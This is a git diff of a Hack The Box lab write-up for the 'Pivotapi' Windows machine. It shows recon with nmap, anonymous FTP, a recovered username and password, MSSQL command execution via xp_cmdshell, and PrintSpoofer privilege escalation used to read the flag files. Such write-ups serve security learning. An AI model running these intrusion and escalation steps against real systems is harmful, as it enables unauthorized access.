@@ -1,9 +1,13 @@
 # Pivotapi
 #windows #CTF #HTB
 
+Level : Insane
 IP: 10.10.10.240
 OS : Windows 
 
+## Setup
+
+Lets start by adding the IP to our hosts file
 ```bash
 echo "10.10.10.240 pivotapi.htb" >> /etc/hosts
 ```
@@ -11,7 +15,7 @@ echo "10.10.10.240 pivotapi.htb" >> /etc/hosts
 ## Recon 
 Lets start with look at what ports are open. 
 
-## nmap
+### nmap
 
 ```bash
 nmap -sV -sC -Pn -o scan pivotapi.htb
@@ -86,7 +90,7 @@ Host script results:
 
 We can see there a FTP server open which accept anonymous login. 
 
-## FTP
+### FTP
 
 ```bash
 ftp -pi pivotapi.htb  
@@ -169,7 +173,7 @@ We got our first user Kaorz : Roper4155
 Get along of *CrackMapExec*
 https://github.com/byt3bl33d3r/CrackMapExec
 
-## SMB
+### SMB
 
 We will now login into smb and see what we have access too. 
 
@@ -309,6 +313,8 @@ SQL>
 And we got access to the server. 
 We can run cmd command on the machine by invoking the command *xp-cmdshell* 
 
+## Privileged escalation
+
 ```cmd
 xp_cmdshell whoami /priv
 nt service\\mssql$sqlexpress
@@ -371,8 +377,10 @@ I have not set up my development env, i need to look for allready build version.
 I found a build version of printspoofer
 https://github.com/dievus/printspoofer
 
-There is a problem with the mssql shell when it comes to upload files if you have python3 3.9+ 
+There is a problem with the mssql_shell when it comes to upload files if you have python3 3.9+ 
+where base64 has which from *encodestring* to *encodebytes*. I have modified the script to handle both environments 
 
+mssql_shell.py
 ```python
 #!/usr/bin/env python
 from __future__ import print_function
@@ -503,8 +511,10 @@ Upload PrintSpoofer to the server and get the flags
 UPLOAD PrintSpoofer.exe C:\temp\PrintSpoofer.exe
 cd C:\temp
 printspoofer.exe -i -c "powershell -c type C:\Users\3v4Si0N\Desktop\user.txt"
+
 printspoofer.exe -i -c "powershell -c type C:\Users\cybervaca\Desktop\root.txt"
 ```
+And we got user and root. 
 
 ### Writeups 
 code --> 81b32769d55ca9fc807a86b24709a7f9
